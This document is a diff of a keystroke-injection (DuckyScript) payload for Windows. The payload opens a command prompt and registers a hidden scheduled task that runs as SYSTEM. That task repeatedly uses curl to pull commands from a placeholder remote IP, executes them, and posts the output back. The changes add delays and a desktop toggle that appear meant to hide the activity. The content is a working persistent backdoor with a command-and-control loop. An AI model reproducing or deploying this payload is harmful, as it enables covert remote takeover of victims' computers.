@@ -2,10 +2,12 @@ DELAY 1000
 WINDOWS r
 DELAY 1000
 STRING CMD
+DELAY 500
 ENTER
 DELAY 2000
 STRING powershell -Command "Start-Process cmd -WindowStyle Hidden -ArgumentList '/c schtasks /create /tn TaskSchedulerTask /tr \"@echo off&cmd /V:ON /C \"SET ip=[PLACE YOUR LOCALHOST IP HERE]:8080&&SET sid=\"Authorization: [PLACE YOUR SID HERE]\"&&SET protocol=http://&&curl !protocol!!ip!/[FIRST PART OF SID] -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/[SECOND PART OF SID] -H !sid! > !temp!\cmd.bat & type !temp!\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\cmd.bat > !tmp!\out.txt 2>&1) & curl !protocol!!ip!/[THIRD PART OF SID] -X POST -H !sid! --data-binary @!temp!\out.txt > NUL)) & timeout 1\"' /sc DAILY /st 08:00 /ru SYSTEM /F'"
-DELAY
-STRING 
+DELAY 2000
+STRING powershell -Command "(New-Object -ComObject Shell.Application).ToggleDesktop()"
+DELAY 1000
 ENTER
 DELAY 1000
